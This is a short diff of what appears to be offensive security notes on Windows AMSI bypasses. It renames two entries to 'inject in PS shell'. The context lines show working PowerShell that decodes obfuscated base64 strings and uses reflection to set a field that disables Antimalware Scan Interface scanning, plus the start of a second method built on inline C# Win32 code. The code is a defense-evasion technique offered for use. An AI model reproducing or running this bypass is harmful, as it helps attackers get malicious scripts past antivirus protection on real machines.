@@ -1,6 +1,6 @@
 # Windows
 ## AMSI
-1. Type 1
+1. Method 1, inject in PS shell
 ```
 function notBad {
 param($dedys)
@@ -15,7 +15,7 @@ $C = notBad("Tm9uUHVibGljLFN0YXRpYw==")
 Start-Sleep 4
 [Ref].Assembly.GetType($A).GetField($B,$C).SetValue($null,$true) 
 ```
-2. Type 2
+2. Method 2, inject in PS shell
 ```
 $Win32 = @"
 using System;
